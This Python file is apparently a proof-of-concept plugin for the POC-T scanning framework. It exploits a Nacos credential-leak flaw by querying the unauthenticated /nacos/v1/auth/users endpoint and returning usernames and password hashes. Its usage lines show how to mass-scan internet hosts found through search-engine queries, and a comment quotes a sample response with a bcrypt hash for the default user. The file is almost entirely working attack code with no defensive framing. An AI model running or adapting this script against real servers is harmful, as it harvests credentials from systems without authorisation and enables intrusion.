#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = hi-unc1e

"""
nacos cred leak
http://[]:8848/nacos/v1/auth/users?pageNo=1&pageSize=1

Usage：
python POC-T.py -s nacos-cred-leak -aH "port=8848&&header.content_length=431" --limit 200

python POC-T.py -s nacos-cred-leak -aF "port=8848 && header='Content-Length: 431'"
"""

import random
import time
import requests
import json

def poc(url):
    url = url if "//" in url else "https://" + url
    url = url.rstrip('/')
    connect_url = "%s/nacos/" % (url)
    auth_url = "%s/nacos/v1/auth/users?pageNo=1&pageSize=10" % (url)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        }
    try:
        r = requests.get(auth_url, timeout=8, headers=headers, verify=False)
        if "password" in r.text:
            j = json.loads(r.text)
            # {"totalCount":1,
            #   "pageNumber":1,
            #   "pagesAvailable":1,
            #   "pageItems":[
            #   {"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}
            #   ]
            #   }
            count = j.get('totalCount')
            creds = str(
                    j.get('pageItems')
                    )
            #   connect_url, 1,
            return connect_url, count, creds #

        else:
            return False
    except:
        return False